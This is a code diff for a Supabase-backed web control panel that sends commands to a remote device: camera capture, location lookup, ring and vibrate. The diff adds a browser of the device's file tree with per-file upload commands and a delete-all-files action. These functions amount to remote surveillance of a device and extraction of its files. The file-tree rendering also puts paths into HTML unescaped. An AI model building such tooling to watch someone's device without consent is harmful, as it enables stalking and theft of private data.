@@ -10,7 +10,7 @@ console.log('Supabase initialized');
 
 let session = null;
 
-// UI Helpers
+// ---------- UI Helpers ----------
 function showLoading(buttonId, show) {
     const btn = document.getElementById(buttonId);
     if (!btn) return;
@@ -41,7 +41,7 @@ function showSection(sectionId) {
     document.getElementById(sectionId).classList.remove('d-none');
 }
 
-// Authentication
+// ---------- Authentication ----------
 async function login(email, password) {
     showLoading('login', true);
     hideError();
@@ -50,6 +50,7 @@ async function login(email, password) {
         if (error) throw error;
         session = data.session;
         showSection('commands-section');
+        await fetchFileTree();
         await loadFiles();
         await loadLastLocation();
     } catch (error) {
@@ -87,15 +88,14 @@ document.getElementById('retry-login').addEventListener('click', () => {
 
 document.getElementById('logout').addEventListener('click', logout);
 
-// Command Validation
+// ---------- COMMANDS ----------
 function validateCommandOptions(type, options) {
     // Add any custom validation logic here, e.g. for durations/params
     return true;
 }
 
-// COMMANDS
 async function sendCommand(type, options = {}) {
-    showLoading(type === 'batchLocations' ? 'batchLocations' : type, true);
+    showLoading(type === 'deleteAllFiles' ? 'deleteAllFiles' : type, true);
     try {
         const { data: user, error: userError } = await supabase.auth.getUser();
         if (userError || !user.user) throw new Error('Not authenticated');
@@ -109,11 +109,70 @@ async function sendCommand(type, options = {}) {
         console.error('Command failed:', error);
         showError(`Command failed: ${error.message}`);
     } finally {
-        showLoading(type === 'batchLocations' ? 'batchLocations' : type, false);
+        showLoading(type === 'deleteAllFiles' ? 'deleteAllFiles' : type, false);
     }
 }
 
-// Command Button Event Listeners
+// ---------- File Browser ----------
+async function fetchFileTree() {
+    document.getElementById('file-tree-loading').classList.remove('d-none');
+    // The app should sync file structure to a 'filetree' table with columns: path (string), is_dir (bool)
+    try {
+        const { data, error } = await supabase.from('filetree').select('*');
+        if (error) throw error;
+        renderFileBrowser(data);
+    } catch (err) {
+        document.getElementById('file-browser').innerHTML = `<div class="text-danger">Failed to load file tree: ${err.message}</div>`;
+    } finally {
+        document.getElementById('file-tree-loading').classList.add('d-none');
+    }
+}
+
+function renderFileBrowser(filetree) {
+    if (!filetree || filetree.length === 0) {
+        document.getElementById('file-browser').innerHTML = '<em>No files found. Try refreshing.</em>';
+        return;
+    }
+    // Build tree structure
+    const root = {};
+    for (const entry of filetree) {
+        const parts = entry.path.split('/');
+        let node = root;
+        for (let i = 0; i < parts.length; i++) {
+            const part = parts[i];
+            if (!node[part]) node[part] = { __is_dir: i < parts.length - 1 || entry.is_dir, __children: {} };
+            node = node[part].__children;
+        }
+    }
+    // Render recursively
+    function renderNode(node, parentPath = '') {
+        let html = '<ul>';
+        for (const key in node) {
+            if (!node.hasOwnProperty(key)) continue;
+            const entry = node[key];
+            const fullPath = parentPath ? parentPath + '/' + key : key;
+            if (entry.__is_dir) {
+                html += `<li><strong>${key}/</strong>${renderNode(entry.__children, fullPath)}</li>`;
+            } else {
+                html += `<li>${key} <button class="btn btn-sm btn-primary upload-file-btn" data-path="${fullPath}">Upload</button></li>`;
+            }
+        }
+        html += '</ul>';
+        return html;
+    }
+    document.getElementById('file-browser').innerHTML = renderNode(root);
+    document.querySelectorAll('.upload-file-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const path = btn.dataset.path;
+            sendCommand('uploadFile', { path });
+        });
+    });
+}
+
+document.getElementById('refresh-filetree').addEventListener('click', fetchFileTree);
+
+// ---------- Command Button Event Listeners ----------
+
 document.getElementById('capturePhoto').addEventListener('click', async () => {
     const camera = document.getElementById('photo-camera').value;
     const flash = document.getElementById('photo-flash').value;
@@ -136,10 +195,6 @@ document.getElementById('getLocation').addEventListener('click', async () => {
     await sendCommand('getLocation');
 });
 
-document.getElementById('batchLocations').addEventListener('click', async () => {
-    await sendCommand('batchLocations');
-});
-
 document.getElementById('ring').addEventListener('click', async () => {
     await sendCommand('ring', { duration: 5 });
 });
@@ -148,15 +203,12 @@ document.getElementById('vibrate').addEventListener('click', async () => {
     await sendCommand('vibrate', { duration: 1 });
 });
 
-// FILES
-async function loadFiles(page = 1, perPage = 10, type = '', dateStart = '', dateEnd = '') {
+// ---------- File Management ----------
+async function loadFiles(page = 1, perPage = 10) {
     document.getElementById('files-loading').classList.remove('d-none');
     document.getElementById('files-error').classList.add('d-none');
     try {
         let query = supabase.from('files').select('*', { count: 'exact' });
-        if (type) query = query.eq('type', type);
-        if (dateStart) query = query.gte('created_at', dateStart);
-        if (dateEnd) query = query.lte('created_at', dateEnd + 'T23:59:59');
         query = query.order('created_at', { ascending: false })
             .range((page - 1) * perPage, page * perPage - 1);
 
@@ -189,7 +241,6 @@ function renderFilesTable(files) {
         `;
         tbody.appendChild(tr);
     }
-    // Delete file listeners
     document.querySelectorAll('.delete-file').forEach(btn => {
         btn.addEventListener('click', () => showDeleteModal(btn.dataset.id));
     });
@@ -221,34 +272,20 @@ function renderFilesPagination(count, page, perPage) {
         a.textContent = i;
         a.addEventListener('click', (e) => {
             e.preventDefault();
-            const type = document.getElementById('file-type-filter').value;
-            const dateStart = document.getElementById('file-date-start').value;
-            const dateEnd = document.getElementById('file-date-end').value;
-            loadFiles(i, parseInt(document.getElementById('files-per-page').value, 10), type, dateStart, dateEnd);
+            loadFiles(i, parseInt(document.getElementById('files-per-page').value, 10));
         });
         li.appendChild(a);
         pagination.appendChild(li);
     }
 }
 
-// File filters and per page listeners
-document.getElementById('file-type-filter').addEventListener('change', () => {
-    loadFiles(1, parseInt(document.getElementById('files-per-page').value, 10), document.getElementById('file-type-filter').value, document.getElementById('file-date-start').value, document.getElementById('file-date-end').value);
-});
-document.getElementById('file-date-start').addEventListener('change', () => {
-    loadFiles(1, parseInt(document.getElementById('files-per-page').value, 10), document.getElementById('file-type-filter').value, document.getElementById('file-date-start').value, document.getElementById('file-date-end').value);
-});
-document.getElementById('file-date-end').addEventListener('change', () => {
-    loadFiles(1, parseInt(document.getElementById('files-per-page').value, 10), document.getElementById('file-type-filter').value, document.getElementById('file-date-start').value, document.getElementById('file-date-end').value);
-});
 document.getElementById('files-per-page').addEventListener('change', () => {
-    loadFiles(1, parseInt(document.getElementById('files-per-page').value, 10), document.getElementById('file-type-filter').value, document.getElementById('file-date-start').value, document.getElementById('file-date-end').value);
+    loadFiles(1, parseInt(document.getElementById('files-per-page').value, 10));
 });
 document.getElementById('retry-files').addEventListener('click', () => {
     loadFiles();
 });
 
-// Deleting Files
 let fileToDelete = null;
 function showDeleteModal(id) {
     fileToDelete = id;
@@ -267,7 +304,18 @@ document.getElementById('confirmDelete').addEventListener('click', async () => {
     bootstrap.Modal.getInstance(document.getElementById('deleteConfirmModal')).hide();
 });
 
-// LOCATION
+document.getElementById('deleteAllFiles').addEventListener('click', async () => {
+    if (!confirm('Are you sure you want to delete ALL files from Supabase? This cannot be undone.')) return;
+    try {
+        // You must create this function in your Supabase DB
+        await supabase.rpc('delete_all_files');
+        loadFiles();
+    } catch (error) {
+        alert('Failed to delete all files: ' + error.message);
+    }
+});
+
+// ---------- Location ----------
 let map = null;
 let markers = [];
 async function loadLastLocation() {
@@ -351,12 +399,13 @@ document.getElementById('retry-location').addEventListener('click', () => {
     }
 });
 
-// On page load, check if already logged in
+// ---------- On Page Load ----------
 window.addEventListener('DOMContentLoaded', async () => {
     const { data: { session: currentSession } } = await supabase.auth.getSession();
     if (currentSession) {
         session = currentSession;
         showSection('commands-section');
+        await fetchFileTree();
         await loadFiles();
         await loadLastLocation();
     } else {
